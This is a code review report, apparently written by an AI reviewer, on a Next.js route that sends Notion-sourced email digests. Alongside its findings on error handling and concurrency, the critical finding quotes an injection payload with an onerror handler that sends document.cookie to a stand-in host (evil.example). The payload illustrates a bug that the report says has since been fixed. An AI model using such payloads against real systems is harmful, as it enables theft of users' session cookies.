---
phase: 04-notify-route
reviewed: 2026-07-27T00:00:00Z
depth: standard
files_reviewed: 5
files_reviewed_list:
  - apps/web/src/app/api/notify-subscribers/route.ts
  - apps/web/src/lib/notion.ts
  - apps/web/src/site.config.ts
  - packages/core/src/client.ts
  - packages/core/src/types.ts
findings:
  critical: 1
  warning: 3
  info: 4
  total: 8
status: fixed
---

## Fixes Applied (post-review, same session)

- **CR-01 FIXED** — `getEmbeddableThumbnailUrl()` now returns `parsed.href` (normalized) instead of the raw input string, and the `<img src>` interpolation is now wrapped in `escapeHtml()`. Verified the original payload (`https://evil.example/x.jpg" onerror="alert(1)`) no longer contains a literal `"` after the fix, confirmed empirically with a standalone Node repro before and after.
- **WR-01 FIXED** — `resend.broadcasts.create()` is now wrapped in try/catch, mirroring the pattern already used for `getUnemailedPublicPosts()`/`markEmailed()`; a thrown error now returns the same controlled `{ ok: false, code: "send_failed" }` response with a `[Notify]`-prefixed log line instead of escaping as an unhandled exception.
- **WR-03 FIXED** — `buildSectionHtml()` now returns a distinct `invalidExternal` signal (thumbnailType is `"external"` but the URL is malformed/non-https) alongside the existing `downgraded` signal (expiring Notion-hosted URL). The route now logs a separate per-run summary line for each case.
- **WR-02 — NOT fixed, by design.** This is `REQUIREMENTS.md`'s already-accepted, explicitly documented limitation ("Distributed lock / Redis-backed concurrency guard on the notify route... Accepted as a limitation; mitigated via idempotent per-post marking instead") and `04-RESEARCH.md` Pattern 3's identically-scoped "re-scoped cron-double-fire risk... remains an accepted, documented limitation." Not a new finding — re-flagging it here for cross-reference, not re-litigating the decision.
- **IN-01 through IN-04 — deferred**, advisory only per the review's own severity classification. Not blocking.

# Phase 04-notify-route: Code Review Report

**Reviewed:** 2026-07-27T00:00:00Z
**Depth:** standard
**Files Reviewed:** 5
**Status:** issues_found

## Summary

Reviewed the notify-subscribers cron route, its Notion data-access wrappers, and the underlying `NologClient` additions (`getUnemailedPublicPosts`, `markEmailed`, `NotionCapabilityError`, `MissingEmailedPropertyError`, `getFileType`/`thumbnailType`). The auth gate (`safeCompare`), fail-closed configuration check, and per-post isolation for both section building and marking are well constructed and match their documentation. However, the digest HTML builder undermines its own stated security invariant: the thumbnail `<img src>` is interpolated from Notion-sourced content without going through `escapeHtml()`, unlike every other user-controlled string in the same template (title, summary, footer address). That is a real HTML/attribute-injection vector into outbound email and is filed as a Critical finding. Additional warnings cover an unguarded external call and a duplicate-invocation race that could double-send a digest. Info items are minor observability and maintainability gaps.

## Critical Issues

### CR-01: Unescaped thumbnail URL allows HTML attribute injection into the outbound digest email

**File:** `apps/web/src/app/api/notify-subscribers/route.ts:105-109`
**Issue:**
`escapeHtml()`'s own docstring (line 48) claims it exists "so Notion-sourced strings can never break the digest's markup or inject structure into a subscriber's mail client," and it is correctly applied to `title`, `summary`, `physicalAddress`, and `siteTitle`. The thumbnail URL is the one Notion-sourced string that bypasses it:

```ts
const embeddableThumbnail = getEmbeddableThumbnailUrl(post);
...
const imgHtml = embeddableThumbnail
  ? `<img src="${embeddableThumbnail}" alt="${title}" style="max-width: 100%; display: block; margin: 0 0 12px 0;" />`
  : "";
```

`getEmbeddableThumbnailUrl()` (line 67) only checks that the string parses as a `https:` URL via `new URL(post.thumbnail)` — it then returns the *original raw string* (`post.thumbnail`), not the normalized/percent-encoded `parsed.href`. `new URL()` does not throw on a `"` character in the path/query; it only percent-encodes it when the parsed object is *serialized* (`.href`). Since the raw string is returned and used unescaped inside a double-quoted `src="..."` attribute, a `thumbnail` value such as:

```
https://evil.example/x.jpg" onerror="fetch('https://evil.example/c?d='+document.cookie)
```

parses successfully (protocol is still `https:`), passes the check, and is emitted verbatim — breaking out of the `src` attribute and injecting an arbitrary attribute/handler into the digest HTML sent to every subscriber's inbox. Any Notion workspace member with edit access to the `thumbnail` property (not just the deploying site owner) can control this value.

**Fix:** Escape the resolved URL the same way every other field is escaped, and prefer the normalized `href` so the parsed form (not the raw attacker-controlled string) is what gets emitted:

```ts
function getEmbeddableThumbnailUrl(post: Post): string | null {
  if (post.thumbnailType !== "external" || !post.thumbnail) {
    return null;
  }
  try {
    const parsed = new URL(post.thumbnail);
    if (parsed.protocol !== "https:") {
      return null;
    }
    return parsed.href; // normalized form, not the raw input string
  } catch {
    return null;
  }
}
```

```ts
const imgHtml = embeddableThumbnail
  ? `<img src="${escapeHtml(embeddableThumbnail)}" alt="${title}" style="max-width: 100%; display: block; margin: 0 0 12px 0;" />`
  : "";
```

## Warnings

### WR-01: `resend.broadcasts.create()` is the only external call in the route not wrapped in try/catch

**File:** `apps/web/src/app/api/notify-subscribers/route.ts:284-298`
**Issue:** Every other external call in this route (`getUnemailedPublicPosts()`, `markEmailed()`) is wrapped in try/catch with a controlled JSON error response. The send call is not:

```ts
const { error: sendError } = await resend.broadcasts.create({ ... });

if (sendError) {
  console.error(`[Notify] Broadcast send failed: ${sendError.message}`);
  return Response.json({ ok: false, code: "send_failed" }, { status: 500 });
}
```

This assumes the Resend SDK always resolves to a `{ data, error }` shape and never rejects. If the underlying `fetch` throws (network failure, timeout, DNS error, or an unexpected SDK exception) rather than resolving with an `error` field, the exception propagates out of `GET()` uncaught, producing Next.js's generic unhandled-error response instead of this route's structured `{ ok: false, code: ... }` contract — and skipping the `[Notify]`-prefixed log entirely, contrary to the codebase's stated error-handling convention (CLAUDE.md: "Catch errors silently with fallback values", "Log with context prefix").
**Fix:** Wrap the send in the same try/catch pattern used elsewhere:
```ts
let sendError: { message: string } | null = null;
try {
  ({ error: sendError } = await resend.broadcasts.create({ ... }));
} catch (error: unknown) {
  const message = error instanceof Error ? error.message : String(error);
  console.error(`[Notify] Broadcast send threw: ${message}`);
  return Response.json({ ok: false, code: "send_failed" }, { status: 500 });
}
if (sendError) {
  console.error(`[Notify] Broadcast send failed: ${sendError.message}`);
  return Response.json({ ok: false, code: "send_failed" }, { status: 500 });
}
```

### WR-02: No guard against overlapping invocations of the notify route — possible duplicate sends

**File:** `apps/web/src/app/api/notify-subscribers/route.ts:221, 284-293, 313`
**Issue:** Posts are queried as "unemailed" at the top of the handler and only marked `emailed` *after* the broadcast send completes (comment at line 300: "Mark, only after a clean send"). There is no lock, idempotency token, or other mechanism preventing two concurrent invocations of this route (e.g., a manual re-trigger while a scheduled cron run is still in flight, or a platform-level retry after a slow/ambiguous response) from both querying the same unemailed candidates and both successfully sending a broadcast for the same posts before either invocation reaches the marking step. The result would be subscribers receiving the same digest twice — the exact failure mode the "mark only after send" ordering is otherwise careful to avoid for the single-invocation case.
**Fix:** Add a lightweight execution guard — e.g., a short-lived lock recorded via a Notion property, KV entry, or Vercel's own cron concurrency controls — or explicitly document that the route must never be manually triggered while a scheduled run could be in flight, and confirm Vercel Cron's own overlap-prevention guarantees (if any) are actually in effect for this project's plan tier.

### WR-03: `getEmbeddableThumbnailUrl` silently drops malformed/non-https external thumbnails with no operator-visible signal

**File:** `apps/web/src/app/api/notify-subscribers/route.ts:97-109`
**Issue:** The `downgraded` flag returned by `buildSectionHtml()` is defined as `embeddableThumbnail === null && post.thumbnailType === "file"` (line 106) — it only fires for the documented "file expires" case. A post whose `thumbnailType` is `"external"` but whose URL is malformed or non-https (e.g., `http://...`, a bare string, a `data:` URI) also ends up with `embeddableThumbnail === null`, silently rendering text-only with **no** log entry and **no** contribution to `downgradedThumbnailCount`. An operator has no way to discover that a post's external thumbnail was rejected and why.
**Fix:** Track and log this case distinctly, e.g. a second counter (`invalidExternalThumbnailCount`) incremented whenever `post.thumbnailType === "external"` but `getEmbeddableThumbnailUrl()` returns `null`, with its own summary log line.

## Info

### IN-01: `getFileUrl()` and `getFileType()` read the same property independently — drift risk

**File:** `packages/core/src/client.ts:66-96`
**Issue:** Both functions independently re-implement the same key/fallbackKey lookup and `files[0]` selection over the `files` property. This is called out in the docstring as a deliberate trade-off, but it still means any future change to how the "first file" is selected (e.g., picking the last file, or filtering by type) must be made in two places or the URL and its reported type can silently desync.
**Fix:** Consider a single internal helper `getFirstFile(page, key, fallbackKey)` returning the raw file entry, with `getFileUrl`/`getFileType` as thin wrappers over it, once (if) `04-RESEARCH.md`'s stated reason for keeping them separate no longer applies.

### IN-02: `patchPage()`'s 400-based `MissingEmailedPropertyError` branch is likely unreachable in practice

**File:** `packages/core/src/client.ts:382-391` (compare with `getUnemailedPublicPosts` at `packages/core/src/client.ts:299-306`)
**Issue:** `getUnemailedPublicPosts()` already filters on the `emailed` checkbox property in its query and throws `MissingEmailedPropertyError` if that query fails due to the property not existing in the schema. Since the notify route always calls `getUnemailedPublicPosts()` before it can reach `markEmailed()`/`patchPage()` for any post, a successful query already proves the `emailed` property exists — so the equivalent 400-pattern-match in `patchPage()` guards against a state (property missing at patch time but present at query time) that shouldn't be reachable through the notify route's call path. The code itself flags this pattern-match as "UNVERIFIED against live Notion behaviour," which is reasonable, but the dead-path aspect is worth noting alongside that.
**Fix:** No urgent action required; when the open research question is resolved, revisit whether this branch is still needed or can be simplified/removed.

### IN-03: `GET()` handler in the notify route mixes many responsibilities in one ~160-line function

**File:** `apps/web/src/app/api/notify-subscribers/route.ts:178-337`
**Issue:** Auth, configuration gating, querying, batch-capping, section assembly, sending, and marking are all inlined in a single handler. This is heavily commented and each block is individually clear, but the function as a whole exceeds the project's usual function-size norms and makes unit-testing any single stage (e.g., batch-cap logic, or the marking loop) without exercising the whole route harder than necessary.
**Fix:** Consider extracting pure helpers (e.g., `capBatch(candidates, envValue)`, `markAll(sections)`) that the route composes, leaving `GET()` as an orchestration-only function. Not urgent given current test coverage is presumably route-level.

### IN-04: `emailed` checkbox lookup has no fallback key, unlike every other property extractor

**File:** `packages/core/src/client.ts:110-119`, compare `mapPageToPost` at `packages/core/src/client.ts:136`
**Issue:** Every other extractor (`getRichText`, `getSelect`, `getMultiSelect`, `getFileUrl`, `getFileType`, `getPeople`) accepts a `fallbackKey` to tolerate a differently-cased property name (e.g., `"summary"`/`"Summary"`). `getCheckbox(page, "emailed")` is called with only the lowercase key, so a forker who names the property `"Emailed"` (capital E) — consistent with the capitalization used for every other property in their own Notion database — will have every post report `emailed: false` regardless of its actual value, and the Notion-side query filter (`packages/core/src/client.ts:281`) will similarly never match. This is a plausible real-world footgun given the rest of the schema deliberately supports both cases.
**Fix:** Either document explicitly (README/schema setup instructions) that the property name must be lowercase `emailed` exactly, or add the same fallback-key support used elsewhere for consistency.

---

_Reviewed: 2026-07-27T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
